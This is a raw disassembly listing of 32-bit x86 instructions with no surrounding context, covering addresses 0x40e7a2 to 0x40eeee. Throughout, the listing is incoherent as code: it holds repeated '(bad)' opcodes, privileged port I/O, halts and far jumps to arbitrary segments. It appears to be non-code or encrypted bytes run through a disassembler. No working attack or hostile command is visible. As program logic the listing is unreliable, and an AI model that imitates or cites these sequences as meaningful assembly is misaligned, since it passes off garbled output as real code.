  40e7a2:	lods   al,BYTE PTR ds:[esi]
  40e7a3:	int3   
  40e7a4:	xchg   ecx,eax
  40e7a5:	add    edi,DWORD PTR [esp+esi*2+0x21d1c6d2]
  40e7ac:	into   
  40e7ad:	out    0x23,eax
  40e7af:	mov    ebp,0xc672c4c0
  40e7b4:	pop    ecx
  40e7b5:	jne    0x40e73a
  40e7b7:	adc    ch,BYTE PTR [eax]
  40e7b9:	retf   0xdbce
  40e7bc:	les    ebx,FWORD PTR [ebx+0x24c00c47]
  40e7c2:	mov    ebp,0x3827bcca
  40e7c7:	mov    edi,0x13eda781
  40e7cc:	(bad)  
  40e7ce:	xchg   ecx,eax
  40e7cf:	push   ebp
  40e7d0:	or     eax,0x6a445277
  40e7d5:	sub    al,0x8f
  40e7d7:	fwait
  40e7d8:	dec    ebx
  40e7d9:	in     al,dx
  40e7da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e7db:	pop    ecx
  40e7dc:	mov    DWORD PTR [ebx+edx*1],edi
  40e7df:	xchg   ecx,eax
  40e7e0:	test   eax,0xc8cf6016
  40e7e6:	retf   
  40e7e7:	popa   
  40e7e8:	imul   esp,DWORD PTR [ebx+ebp*2],0x76
  40e7ec:	(bad)  
  40e7ee:	mov    eax,0xd8cb089d
  40e7f3:	xchg   esp,eax
  40e7f4:	cmp    eax,0x8ac8ceed
  40e7f9:	iret   
  40e7fa:	nop
  40e7fb:	adc    eax,0x4484c5bd
  40e800:	ficomp WORD PTR [eax+ecx*4+0x27]
  40e804:	mov    ebx,0x8d40992
  40e809:	retf   
  40e80a:	jmp    0x40e7f8
  40e80c:	pop    ebx
  40e80d:	aaa    
  40e80e:	popf   
  40e80f:	sbb    al,BYTE PTR [ecx]
  40e811:	push   edi
  40e812:	movlps QWORD PTR [eax+0x1764b7ca],xmm4
  40e819:	xchg   esp,eax
  40e81a:	shl    bl,0x87
  40e81d:	add    eax,0x63dcd148
  40e822:	sub    eax,esp
  40e824:	stos   DWORD PTR es:[edi],eax
  40e825:	xor    al,0xc8
  40e827:	mov    ds:0x532fef6a,al
  40e82c:	ja     0x40e7da
  40e82e:	push   edi
  40e82f:	mov    ds:0x18613b78,al
  40e834:	(bad)  
  40e835:	push   cs
  40e836:	adc    DWORD PTR [edi+eiz*2],edi
  40e839:	repz pop edi
  40e83b:	mov    dh,0x41
  40e83d:	or     BYTE PTR [ecx],cl
  40e83f:	in     al,0x5c
  40e841:	cmp    al,0x74
  40e843:	test   DWORD PTR [ecx+0x55],edi
  40e846:	pop    ss
  40e847:	mov    edi,0xbeb4da38
  40e84c:	jp     0x40e857
  40e84e:	imul   esi,DWORD PTR [eax-0x4b6001a9],0xffffffd9
  40e855:	pop    ebp
  40e856:	xor    DWORD PTR [ebx+eax*8],ecx
  40e859:	out    0xb4,al
  40e85b:	aas    
  40e85c:	ins    DWORD PTR es:[edi],dx
  40e85d:	pusha  
  40e85e:	in     al,dx
  40e85f:	lahf   
  40e860:	mov    DWORD PTR [ebx-0x35],ebx
  40e863:	mov    eax,ds:0x4053e805
  40e868:	cli    
  40e869:	js     0x40e869
  40e86b:	push   es
  40e86c:	adc    al,0x73
  40e86e:	xor    eax,0x104b43bc
  40e873:	xor    eax,0x85730662
  40e878:	iret   
  40e879:	lock mov DWORD PTR [ebx],0x8263ff40
  40e880:	hlt    
  40e881:	sbb    dh,bl
  40e883:	mov    cl,BYTE PTR [eax+ebp*4-0x335dce1a]
  40e88a:	pop    eax
  40e88b:	rol    dl,1
  40e88d:	fidiv  WORD PTR [ebx+edx*2+0x20]
  40e891:	out    0x63,eax
  40e893:	in     al,dx
  40e894:	cmc    
  40e895:	ret    
  40e896:	push   0xb253bd78
  40e89b:	out    dx,al
  40e89c:	cmp    dl,BYTE PTR [eax]
  40e89e:	dec    eax
  40e89f:	mov    ch,0xbd
  40e8a1:	rcl    DWORD PTR [edi-0x549d77d7],0x9e
  40e8a8:	retf   0xae11
  40e8ab:	jl     0x40e90e
  40e8ad:	mov    ds:0xb54ffeca,eax
  40e8b2:	aad    0x6c
  40e8b4:	cld    
  40e8b5:	rcr    BYTE PTR [ecx+0x8],cl
  40e8b8:	xchg   edx,eax
  40e8b9:	mov    ecx,0x5349b9dc
  40e8be:	pop    ss
  40e8bf:	mov    ah,0xa9
  40e8c1:	mov    WORD PTR [edi+0x6],es
  40e8c4:	and    ch,cl
  40e8c6:	xor    eax,0xbca4b1c1
  40e8cb:	inc    ebx
  40e8cc:	div    DWORD PTR [ebx+0x7349bbb7]
  40e8d2:	addr16 mov dl,0x6
  40e8d5:	inc    esi
  40e8d6:	inc    esp
  40e8d7:	sub    DWORD PTR [ecx+0x29be1b96],ebx
  40e8dd:	mov    ds:0x98e2bfd,al
  40e8e2:	cmp    ch,BYTE PTR [eax]
  40e8e4:	ret    
  40e8e5:	outs   dx,DWORD PTR ds:[esi]
  40e8e6:	aam    0xf9
  40e8e8:	(bad)  
  40e8e9:	mov    edi,0xf3b270e9
  40e8ee:	sbb    eax,0xd4a65163
  40e8f3:	stos   DWORD PTR es:[edi],eax
  40e8f4:	outs   dx,DWORD PTR ds:[esi]
  40e8f5:	test   eax,0xfac9cda6
  40e8fa:	sbb    al,0x59
  40e8fc:	aas    
  40e8fd:	stos   DWORD PTR es:[edi],eax
  40e8fe:	lds    esi,FWORD PTR [esi+eiz*2+0x64]
  40e902:	out    0xe8,eax
  40e904:	fcmovnb st,st(2)
  40e906:	push   cs
  40e907:	push   es
  40e908:	sub    DWORD PTR [ebp+0x51a33458],esp
  40e90e:	dec    eax
  40e90f:	sbb    esi,ecx
  40e911:	add    eax,0x1e32df3a
  40e916:	adc    eax,0xf0f3ff8b
  40e91b:	loopne 0x40e931
  40e91d:	sub    DWORD PTR [ecx-0x78b740a0],0x23
  40e924:	data16 jle 0x40e92d
  40e927:	or     ax,0xba9d
  40e92b:	mov    dh,0x9d
  40e92d:	inc    edi
  40e92e:	outs   dx,DWORD PTR ds:[esi]
  40e92f:	xchg   ebp,eax
  40e930:	mov    dl,0x5
  40e932:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e933:	sub    BYTE PTR [ebx],0x0
  40e936:	and    DWORD PTR [esp+eax*4-0x9],edi
  40e93a:	sbb    BYTE PTR [ebp+0x67],dh
  40e93d:	mov    eax,ds:0x751ba6cb
  40e942:	ins    DWORD PTR es:[edi],dx
  40e943:	pop    ss
  40e944:	enter  0x3de5,0xa3
  40e948:	inc    esi
  40e949:	addr16 mov ebp,0xe5aba21
  40e94f:	clc    
  40e950:	mov    cl,0x3a
  40e952:	test   DWORD PTR [eax+ebx*4],edi
  40e955:	and    esp,ebp
  40e957:	adc    eax,0x1cd892a8
  40e95c:	stc    
  40e95d:	(bad)  
  40e95e:	(bad)  
  40e960:	cmp    DWORD PTR ss:[esi],edx
  40e963:	push   ebp
  40e964:	sbb    eax,0x6c13fffe
  40e969:	and    BYTE PTR [edi-0x60],ch
  40e96c:	xor    BYTE PTR [ecx+ecx*8],cl
  40e96f:	cmp    ebx,DWORD PTR [esi]
  40e971:	fdiv   DWORD PTR [edi+0x79]
  40e974:	rcr    BYTE PTR [ebp+0x5d339c7f],1
  40e97a:	mov    ecx,DWORD PTR [ecx]
  40e97c:	js     0x40e998
  40e97e:	int3   
  40e97f:	push   ecx
  40e980:	add    bh,BYTE PTR [ebx-0x2ca161c8]
  40e986:	pusha  
  40e987:	and    bl,BYTE PTR [edi-0x4d]
  40e98a:	neg    ah
  40e98c:	les    eax,FWORD PTR ds:0x9846f2b2
  40e992:	nop
  40e993:	mov    cl,0xbb
  40e995:	and    edi,eax
  40e997:	mov    ch,0x93
  40e999:	add    eax,0x2ef48e79
  40e99e:	(bad)
  40e9a1:	jb     0x40e9ab
  40e9a3:	mov    dh,0x9
  40e9a5:	mov    edi,0x30efa8f4
  40e9aa:	cmp    ebp,DWORD PTR [edi+0x11]
  40e9ad:	retf   
  40e9ae:	mov    ah,BYTE PTR [edi-0x1a]
  40e9b1:	or     DWORD PTR [ecx-0x78],ecx
  40e9b4:	fs pop ds
  40e9b6:	xor    eax,0x939faa3
  40e9bb:	cdq    
  40e9bc:	cmp    eax,0x93f3cbb
  40e9c1:	cli    
  40e9c2:	mov    bl,0x75
  40e9c4:	daa    
  40e9c5:	jmp    0x40ea31
  40e9c7:	adc    BYTE PTR [eax-0x7c],0x2e
  40e9cb:	fnstenv [ebx]
  40e9cd:	sub    bh,BYTE PTR [ecx+0x76b06c3f]
  40e9d3:	mov    bl,0xf3
  40e9d5:	mov    BYTE PTR [esi+0x7de9a7b0],cl
  40e9db:	push   edx
  40e9dc:	sahf   
  40e9dd:	mov    ebx,0x415f17cd
  40e9e2:	repz xchg edx,eax
  40e9e4:	xchg   ebp,eax
  40e9e5:	mov    BYTE PTR [ecx+edi*8+0x825a1c7],cl
  40e9ec:	jge    0x40e977
  40e9ee:	mov    ah,0xab
  40e9f0:	popa   
  40e9f1:	and    edx,edi
  40e9f3:	mov    cs,WORD PTR [ebx]
  40e9f5:	mov    esp,0x75cf3511
  40e9fa:	inc    ecx
  40e9fb:	jno    0x40e9a3
  40e9fd:	xchg   DWORD PTR [eax-0x66],ecx
  40ea00:	repnz xor DWORD PTR [ebx],eax
  40ea03:	lahf   
  40ea04:	cmc    
  40ea05:	cmp    al,0x3f
  40ea07:	dec    ebx
  40ea08:	pop    es
  40ea09:	(bad)  
  40ea0a:	add    eax,0xfbd5fcd3
  40ea0f:	cmp    eax,0xafee4a2d
  40ea14:	jae    0x40e9b5
  40ea16:	std    
  40ea17:	pop    esi
  40ea18:	and    dh,bh
  40ea1a:	das    
  40ea1b:	data16 jns 0x40e9df
  40ea1e:	cwde   
  40ea1f:	mov    dh,0xd5
  40ea21:	dec    edi
  40ea22:	push   esp
  40ea23:	add    cl,dl
  40ea25:	popf   
  40ea26:	fdivr  st(7),st
  40ea28:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ea29:	dec    edx
  40ea2a:	or     bh,BYTE PTR [eax+esi*1+0x1d]
  40ea2e:	inc    esp
  40ea2f:	sbb    BYTE PTR [eax+0x25],bh
  40ea32:	and    BYTE PTR [esi],ah
  40ea34:	sub    al,0x4e
  40ea36:	mov    BYTE PTR [ebx+0x46],al
  40ea39:	test   DWORD PTR [eax-0x135324e7],edi
  40ea3f:	inc    ebp
  40ea40:	jle    0x40ea5e
  40ea42:	ror    DWORD PTR [ebx+ebx*4],0x29
  40ea46:	loope  0x40e9fd
  40ea48:	repnz into 
  40ea4a:	and    BYTE PTR [ecx+0x19b547c],dl
  40ea50:	(bad)  
  40ea51:	int    0x54
  40ea53:	inc    ebp
  40ea54:	lahf   
  40ea55:	lahf   
  40ea56:	mov    edx,DWORD PTR [ecx]
  40ea58:	and    BYTE PTR [edi+0x1],al
  40ea5b:	lock adc BYTE PTR [edi+edx*4],ch
  40ea5f:	sbb    DWORD PTR [eax-0x4a],esp
  40ea62:	inc    edx
  40ea63:	(bad)  
  40ea64:	xor    bl,bh
  40ea66:	std    
  40ea67:	adc    DWORD PTR [edx],ebx
  40ea69:	pop    edx
  40ea6a:	cmp    eax,0xd2ff9deb
  40ea6f:	lea    ebp,[edx-0x4ac1947c]
  40ea75:	push   ebx
  40ea76:	mov    edx,DWORD PTR ds:0x82a37cb4
  40ea7c:	pop    edi
  40ea7d:	fild   QWORD PTR [ecx-0x6f32d2c3]
  40ea83:	ret    0x9590
  40ea86:	ja     0x40eae8
  40ea88:	jo     0x40eafa
  40ea8a:	outs   dx,DWORD PTR ds:[esi]
  40ea8b:	call   0x963b:0x35abf6c0
  40ea92:	mov    al,ds:0xd593afc6
  40ea97:	cmp    eax,DWORD PTR [ecx+0x1e]
  40ea9a:	lods   al,BYTE PTR ds:[esi]
  40ea9b:	aas    
  40ea9c:	ficomp WORD PTR [edi]
  40ea9e:	mov    edi,0x21576f5
  40eaa3:	aaa    
  40eaa4:	aad    0x22
  40eaa6:	mov    ch,0xec
  40eaa8:	mov    ecx,DWORD PTR [edx]
  40eaaa:	lods   al,BYTE PTR ds:[esi]
  40eaab:	push   edi
  40eaac:	cs pop ebp
  40eaae:	push   edx
  40eaaf:	jecxz  0x40eac4
  40eab1:	dec    ebx
  40eab2:	js     0x40eaee
  40eab4:	pop    ss
  40eab5:	inc    ebp
  40eab6:	xor    eax,0xd5c73df7
  40eabb:	(bad)  
  40eabc:	call   0x1cb8188d
  40eac1:	inc    esp
  40eac2:	je     0x40eafb
  40eac4:	cmp    edx,DWORD PTR [ebx+0x2d]
  40eac7:	jnp    0x40eaee
  40eac9:	(bad)  
  40eaca:	cmp    al,BYTE PTR [ecx]
  40eacc:	sbb    al,0x8b
  40eace:	inc    esi
  40eacf:	xchg   dl,dl
  40ead1:	popa   
  40ead2:	mov    dl,0x87
  40ead4:	shr    BYTE PTR [edi-0x34],0x82
  40ead8:	mov    ebp,0xe9a35e01
  40eadd:	xchg   ebx,eax
  40eade:	lods   al,BYTE PTR ds:[esi]
  40eadf:	jns    0x40eb55
  40eae1:	xor    ch,BYTE PTR [ebx+0x67]
  40eae4:	rsqrtps xmm2,XMMWORD PTR [esi]
  40eae7:	sbb    ecx,DWORD PTR [eax+ecx*8+0x3bb9c330]
  40eaee:	cli    
  40eaef:	popa   
  40eaf0:	xor    al,0x8a
  40eaf2:	faddp  st(6),st
  40eaf4:	je     0x40eab9
  40eaf6:	cmp    al,0xda
  40eaf8:	mov    al,0xaa
  40eafa:	dec    ebp
  40eafb:	jbe    0x40eb4a
  40eafd:	xchg   ecx,eax
  40eafe:	push   edx
  40eaff:	inc    ebp
  40eb00:	outs   dx,DWORD PTR ds:[esi]
  40eb01:	lods   eax,DWORD PTR ds:[esi]
  40eb02:	iret   
  40eb03:	jmp    0x504f8c1f
  40eb08:	imul   ebx,DWORD PTR [ebx],0xb3007a3f
  40eb0e:	into   
  40eb0f:	das    
  40eb10:	mov    ah,0xe0
  40eb12:	adc    BYTE PTR [ecx+eax*2],bh
  40eb15:	ficomp DWORD PTR [edi+0x59]
  40eb18:	test   al,0x39
  40eb1a:	(bad)
  40eb1e:	jmp    0xcb9e:0x83710bac
  40eb25:	adc    dh,BYTE PTR ss:[eax-0x54cb108b]
  40eb2c:	dec    edi
  40eb2d:	pushf  
  40eb2e:	and    BYTE PTR [eax+0x42532017],ah
  40eb34:	imul   ebx,DWORD PTR [edi+0x78],0xffffffa5
  40eb38:	out    0x3f,al
  40eb3a:	(bad)  
  40eb3b:	or     BYTE PTR [esi-0x72],0x56
  40eb3f:	xchg   esp,eax
  40eb40:	sbb    eax,ecx
  40eb42:	or     BYTE PTR [ebp+ecx*8-0x4],bh
  40eb46:	in     al,0x38
  40eb48:	fild   WORD PTR [esi+0x4]
  40eb4b:	ss mov ebx,0xe846e57a
  40eb51:	jmp    0x40eb76
  40eb53:	and    al,0x4e
  40eb55:	retf   0x2a4c
  40eb58:	pop    ebx
  40eb59:	xchg   esp,eax
  40eb5a:	inc    ebx
  40eb5b:	cli    
  40eb5c:	jle    0x40eb8d
  40eb5e:	hlt    
  40eb5f:	aaa    
  40eb60:	sti    
  40eb61:	dec    edx
  40eb62:	cmp    al,0x15
  40eb64:	adc    eax,0x12e92710
  40eb69:	mov    ah,0x54
  40eb6b:	test   ecx,ebp
  40eb6d:	dec    edx
  40eb6e:	cmp    ebp,DWORD PTR [eax]
  40eb70:	or     BYTE PTR [edi+ecx*2-0x3cb4a204],al
  40eb77:	sahf   
  40eb78:	push   edi
  40eb79:	jno    0x40eb0e
  40eb7b:	adc    DWORD PTR [esi],eax
  40eb7d:	and    DWORD PTR [edi+0x38889484],eax
  40eb83:	adc    al,0x91
  40eb85:	scas   al,BYTE PTR es:[edi]
  40eb86:	pushf  
  40eb87:	das    
  40eb88:	retf   
  40eb89:	lods   eax,DWORD PTR ds:[esi]
  40eb8a:	jmp    0x40eb7e
  40eb8c:	mov    bh,0xb3
  40eb8e:	and    DWORD PTR [esi+ebx*1-0x74de185c],esp
  40eb95:	pop    es
  40eb96:	inc    ebp
  40eb97:	sub    BYTE PTR [ebp+0x6e053f86],0x69
  40eb9e:	fwait
  40eb9f:	xlat   BYTE PTR ds:[ebx]
  40eba0:	adc    edx,DWORD PTR [ebp+ecx*2+0x4322e6e4]
  40eba7:	jmp    0xa942:0xb1bdc5ba
  40ebae:	mov    ds:0xedc7bebd,eax
  40ebb3:	mov    dh,0x8a
  40ebb5:	in     eax,0xad
  40ebb7:	iret   
  40ebb8:	inc    esi
  40ebb9:	xchg   DWORD PTR [edi+0x2137e76e],esp
  40ebbf:	mov    edx,ss
  40ebc1:	push   cs
  40ebc2:	std    
  40ebc3:	call   0xc2d2:0x93e0d873
  40ebca:	arpl   cx,bx
  40ebcc:	fild   WORD PTR [edi]
  40ebce:	fcom   DWORD PTR [eax+0x0]
  40ebd1:	xchg   DWORD PTR [edx-0xa3271],esi
  40ebd7:	xor    esi,DWORD PTR [edi+0xabc1ff7]
  40ebdd:	mov    esp,0x8a98f968
  40ebe2:	dec    esi
  40ebe3:	fnstcw WORD PTR [ebx]
  40ebe5:	lods   al,BYTE PTR ds:[esi]
  40ebe6:	sti    
  40ebe7:	outs   dx,DWORD PTR ds:[esi]
  40ebe8:	jp     0x40eb86
  40ebea:	mov    DWORD PTR ds:0x16700195,edi
  40ebf0:	icebp  
  40ebf1:	inc    edx
  40ebf2:	lods   eax,DWORD PTR ds:[esi]
  40ebf3:	jns    0x40eb7b
  40ebf5:	fcomi  st,st(1)
  40ebf7:	(bad)  
  40ebf8:	and    cl,BYTE PTR [edx+0x3f]
  40ebfb:	push   edx
  40ebfc:	retf   0xb4b0
  40ebff:	js     0x40ec26
  40ec01:	in     eax,dx
  40ec02:	mov    BYTE PTR [ecx-0x19c74f16],bl
  40ec08:	push   ss
  40ec09:	dec    ebx
  40ec0a:	in     al,dx
  40ec0b:	clc    
  40ec0c:	pop    eax
  40ec0d:	lea    ecx,[ecx]
  40ec0f:	push   0x3adad0e5
  40ec14:	not    dl
  40ec16:	add    al,0xc1
  40ec18:	cmc    
  40ec19:	jmp    0x40ebf2
  40ec1b:	cmp    al,0xff
  40ec1d:	push   ds
  40ec1e:	cmp    DWORD PTR ds:0x2cd2c74a,edi
  40ec24:	dec    ecx
  40ec25:	in     eax,0x9d
  40ec27:	fadd   QWORD PTR [ebx]
  40ec29:	xchg   edx,eax
  40ec2a:	dec    edx
  40ec2b:	jge    0x40ec01
  40ec2d:	inc    eax
  40ec2e:	pop    eax
  40ec2f:	add    ecx,eax
  40ec31:	jo     0x40ebba
  40ec33:	push   esi
  40ec34:	popf   
  40ec35:	nop
  40ec36:	(bad)  
  40ec37:	(bad)  
  40ec38:	daa    
  40ec39:	pop    edi
  40ec3a:	xchg   ecx,eax
  40ec3b:	xor    eax,0x5a9e58e0
  40ec40:	add    BYTE PTR [esi+ecx*1],0x49
  40ec44:	outs   dx,DWORD PTR ds:[esi]
  40ec45:	and    al,0x58
  40ec47:	adc    eax,0xa530e50d
  40ec4c:	mov    dl,0x31
  40ec4e:	xchg   BYTE PTR [esp+ebx*2+0x2e],dl
  40ec52:	repz mov ?,esi
  40ec55:	mov    bl,0x29
  40ec57:	dec    edx
  40ec58:	loope  0x40ec16
  40ec5a:	mov    ds:0xbd9ac2fb,al
  40ec5f:	into   
  40ec60:	push   0xd430f59e
  40ec65:	jmp    0x4749e4f9
  40ec6a:	lahf   
  40ec6b:	adc    al,0x2d
  40ec6d:	mov    bh,al
  40ec6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ec70:	and    ch,dh
  40ec72:	mov    ah,0xcd
  40ec74:	mov    ds:0x5e92ee57,al
  40ec79:	mov    es,WORD PTR [esi+ebp*8+0x59]
  40ec7d:	pop    ebx
  40ec7e:	mov    ah,bl
  40ec80:	stc    
  40ec81:	mov    eax,0x68203eb
  40ec86:	in     al,0xaa
  40ec88:	shr    DWORD PTR [edi+0x1d49211c],cl
  40ec8e:	jmp    0x1900:0x5eddddf9
  40ec95:	pop    es
  40ec96:	lahf   
  40ec97:	xlat   BYTE PTR ds:[ebx]
  40ec98:	inc    ebx
  40ec99:	mov    ch,0x5d
  40ec9b:	outs   dx,BYTE PTR ds:[esi]
  40ec9c:	mov    ecx,0xa6f7e8d8
  40eca1:	call   0xea1cf596
  40eca6:	cmp    ecx,ebx
  40eca8:	pusha  
  40eca9:	test   esp,edx
  40ecab:	push   es
  40ecac:	nop
  40ecad:	into   
  40ecae:	mov    bh,0x75
  40ecb0:	push   ebp
  40ecb1:	jne    0x40ec70
  40ecb3:	scas   al,BYTE PTR es:[edi]
  40ecb4:	punpckldq mm4,DWORD PTR [edi]
  40ecb7:	jns    0x40ec44
  40ecb9:	sbb    edx,DWORD PTR [ebx-0x6d380953]
  40ecbf:	pop    ds
  40ecc0:	xchg   ebx,eax
  40ecc1:	test   eax,0x2fb598ff
  40ecc6:	pop    eax
  40ecc7:	sub    eax,0xebde2441
  40eccc:	dec    eax
  40eccd:	sbb    al,0x12
  40eccf:	mov    ah,bl
  40ecd1:	push   esp
  40ecd2:	fisttp DWORD PTR [edx]
  40ecd4:	sub    DWORD PTR [ecx-0x7bebe3db],esi
  40ecda:	(bad)  
  40ecdb:	adc    esi,eax
  40ecdd:	stos   DWORD PTR es:[edi],eax
  40ecde:	or     al,0x13
  40ece0:	pshufw mm5,mm5,0x3e
  40ece4:	inc    ebp
  40ece5:	clc    
  40ece6:	int3   
  40ece7:	ins    BYTE PTR es:[edi],dx
  40ece8:	sbb    eax,0x8c0ac752
  40eced:	into   
  40ecee:	and    ch,bl
  40ecf0:	cmc    
  40ecf1:	fiadd  WORD PTR [edx+0x46710d48]
  40ecf7:	inc    ebp
  40ecf8:	mov    eax,0xaa72ea31
  40ecfd:	cdq    
  40ecfe:	xchg   edi,eax
  40ecff:	jo     0x40ed06
  40ed01:	(bad)  
  40ed04:	jo     0x40ece4
  40ed06:	test   eax,0x96938998
  40ed0b:	or     eax,0x69d34d7d
  40ed10:	pop    ecx
  40ed11:	clc    
  40ed12:	and    al,BYTE PTR [ebp-0x62ac9cc7]
  40ed18:	xor    ebx,esp
  40ed1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ed1b:	or     BYTE PTR [edi],al
  40ed1d:	mov    bh,0xc6
  40ed1f:	(bad)  
  40ed20:	div    DWORD PTR [ecx]
  40ed22:	ret    0xa8f7
  40ed25:	sbb    al,0x1f
  40ed27:	dec    edx
  40ed28:	scas   eax,DWORD PTR es:[edi]
  40ed29:	ret    0x1185
  40ed2c:	call   DWORD PTR [esi+0x71bde778]
  40ed32:	pop    edi
  40ed33:	pusha  
  40ed34:	dec    ebx
  40ed35:	test   DWORD PTR [esi],0x2ff80e55
  40ed3b:	push   esp
  40ed3c:	adc    eax,0x7383547d
  40ed41:	fadd   DWORD PTR [eax]
  40ed43:	ret    0x2eb3
  40ed46:	out    dx,eax
  40ed47:	mov    dl,0x7f
  40ed49:	adc    al,0xee
  40ed4b:	push   ebx
  40ed4c:	push   cs
  40ed4d:	repz mov cl,0xa1
  40ed50:	push   ebp
  40ed51:	stc    
  40ed52:	push   cs
  40ed53:	fwait
  40ed54:	cwde   
  40ed55:	pop    edx
  40ed56:	cmp    al,0x7e
  40ed58:	les    ebp,FWORD PTR [esi-0x54]
  40ed5b:	mov    edx,0xfa032093
  40ed60:	pop    ecx
  40ed61:	lock cwde 
  40ed63:	fs mov dh,0xce
  40ed66:	(bad)  
  40ed67:	push   0xffffffad
  40ed69:	xor    edx,edi
  40ed6b:	adc    al,0xa9
  40ed6d:	rol    ecx,0xf8
  40ed70:	and    eax,0x34720cb3
  40ed75:	jbe    0x40edea
  40ed77:	mov    dl,0x1e
  40ed79:	mov    ecx,0xfe2d8d0
  40ed7e:	jb     0x40ed93
  40ed80:	xchg   edi,eax
  40ed81:	or     BYTE PTR [ebp-0x6896e640],0x79
  40ed88:	inc    ecx
  40ed89:	retf   
  40ed8a:	and    BYTE PTR [eax+0x71],cl
  40ed8d:	mov    ah,0x9d
  40ed8f:	out    0xf9,al
  40ed91:	mov    ecx,0x7305948a
  40ed96:	dec    esi
  40ed97:	mov    al,ds:0x1e58c166
  40ed9c:	pop    ss
  40ed9d:	sbb    DWORD PTR [edx-0xd],eax
  40eda0:	aaa    
  40eda1:	ret    0x607
  40eda4:	jae    0x40ee0c
  40eda6:	fwait
  40eda7:	or     dh,BYTE PTR [ebp-0x379da7e8]
  40edad:	pop    esp
  40edae:	repnz cmp al,0x3a
  40edb1:	cwde   
  40edb2:	ja     0x40edbe
  40edb4:	pop    ebp
  40edb5:	push   ecx
  40edb6:	pop    esi
  40edb7:	mov    ds:0xf51f16c2,eax
  40edbc:	leave  
  40edbd:	adc    eax,0x584c0c61
  40edc2:	js     0x40ee0c
  40edc4:	not    DWORD PTR [ecx+0x13e88c6f]
  40edca:	ret    0xbd5b
  40edcd:	inc    eax
  40edce:	sub    al,0x59
  40edd0:	mov    cl,0x18
  40edd2:	mov    eax,0x61f04f88
  40edd7:	inc    esp
  40edd8:	(bad)  
  40edd9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40edda:	pop    es
  40eddb:	test   al,0x80
  40eddd:	loope  0x40edb7
  40eddf:	mov    dl,0xd6
  40ede1:	int    0x1c
  40ede3:	add    al,BYTE PTR [ecx-0x1f96367e]
  40ede9:	pop    ss
  40edea:	fidivr WORD PTR [ebx+ecx*4-0x280b0325]
  40edf1:	loop   0x40ee1a
  40edf3:	dec    edi
  40edf4:	dec    bl
  40edf6:	jle    0x40ee6d
  40edf8:	add    dl,dh
  40edfa:	xchg   esi,eax
  40edfb:	jle    0x40ede0
  40edfd:	xchg   ecx,eax
  40edfe:	cmp    BYTE PTR [edx],0x7a
  40ee01:	mov    eax,0x9141e2e3
  40ee06:	leave  
  40ee07:	inc    edi
  40ee08:	mov    ?,eax
  40ee0a:	mov    bh,0x13
  40ee0c:	inc    esi
  40ee0d:	inc    esp
  40ee0e:	cli    
  40ee0f:	mov    ds:0xc5f676b2,al
  40ee14:	xchg   esp,eax
  40ee15:	fdivr  st(5),st
  40ee17:	push   cs
  40ee18:	std    
  40ee19:	mov    bh,0xe0
  40ee1b:	in     eax,0x1f
  40ee1d:	out    0xe6,eax
  40ee1f:	test   eax,0x17ae4c24
  40ee24:	mov    edx,0xd85b2c7e
  40ee29:	xchg   esi,eax
  40ee2a:	push   esi
  40ee2b:	sti    
  40ee2c:	push   ds
  40ee2d:	iret   
  40ee2e:	test   cl,bl
  40ee30:	inc    ebx
  40ee31:	call   0xf4cc:0xd974232f
  40ee38:	aas    
  40ee39:	mov    eax,0x592bf2c7
  40ee3e:	add    BYTE PTR [ecx-0x14],cl
  40ee41:	inc    edx
  40ee42:	jg     0x40ee5c
  40ee44:	xor    al,0xc1
  40ee46:	xchg   BYTE PTR [eax+eax*4+0x43],ah
  40ee4a:	sbb    BYTE PTR [ecx],0x67
  40ee4d:	shr    BYTE PTR [eax+0x69],0x12
  40ee51:	(bad)  
  40ee52:	xlat   BYTE PTR ds:[ebx]
  40ee53:	ret    
  40ee54:	pop    edx
  40ee55:	loope  0x40ede7
  40ee57:	std    
  40ee58:	hlt    
  40ee59:	push   0xffffffbe
  40ee5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ee5c:	jl     0x40ee4d
  40ee5e:	jmp    0x4c0447b1
  40ee63:	(bad)  
  40ee64:	dec    esi
  40ee65:	or     BYTE PTR [eax+0x1f],0xf4
  40ee69:	inc    edx
  40ee6a:	cs or  al,0xa5
  40ee6d:	mov    esi,0xa950bfb0
  40ee72:	data16 jae 0x40ee8b
  40ee75:	pop    ebp
  40ee76:	jecxz  0x40ee98
  40ee78:	xor    dh,ah
  40ee7a:	xor    ebp,DWORD PTR [eax]
  40ee7c:	add    esi,DWORD PTR [edx]
  40ee7e:	jp     0x40ee4d
  40ee80:	xchg   ecx,eax
  40ee81:	mov    esp,0xd02b31b3
  40ee86:	out    dx,eax
  40ee87:	call   0x9a9:0x1b1340f6
  40ee8e:	pop    edi
  40ee8f:	mov    esp,0x9668b3c5
  40ee94:	push   ecx
  40ee95:	mov    bl,0x9
  40ee97:	rcl    BYTE PTR [edx+0x53],1
  40ee9a:	push   0x75
  40ee9c:	in     eax,dx
  40ee9d:	and    BYTE PTR [ecx+0x11],bh
  40eea0:	inc    esi
  40eea1:	enter  0xb0df,0xbc
  40eea5:	shr    BYTE PTR [edx],cl
  40eea7:	pop    ecx
  40eea8:	add    eax,0xdbccd6ca
  40eead:	(bad)  
  40eeae:	icebp  
  40eeaf:	add    al,0xde
  40eeb1:	add    DWORD PTR [eax-0x4c],0x7f1ac5f
  40eeb8:	lds    edx,FWORD PTR [ebx+0x2b]
  40eebb:	dec    esp
  40eebc:	sar    BYTE PTR [esi+0x58],cl
  40eebf:	icebp  
  40eec0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eec1:	sbb    DWORD PTR [ebx+0x49f24c6b],esi
  40eec7:	pusha  
  40eec8:	or     al,0xef
  40eeca:	sar    DWORD PTR [ebx-0x7c],1
  40eecd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eece:	test   BYTE PTR [esi],bh
  40eed0:	dec    eax
  40eed1:	test   al,0x40
  40eed3:	call   0x1a5ec110
  40eed8:	das    
  40eed9:	stc    
  40eeda:	je     0x40eef6
  40eedc:	mov    BYTE PTR [esi+0x2a85e135],bl
  40eee2:	adc    DWORD PTR [edx-0x73],esi
  40eee5:	sar    DWORD PTR [esi-0x22d68f7e],cl
  40eeeb:	aad    0x2c
  40eeed:	scas   al,BYTE PTR es:[edi]
  40eeee:	les    ebx,FWORD PTR [eax]
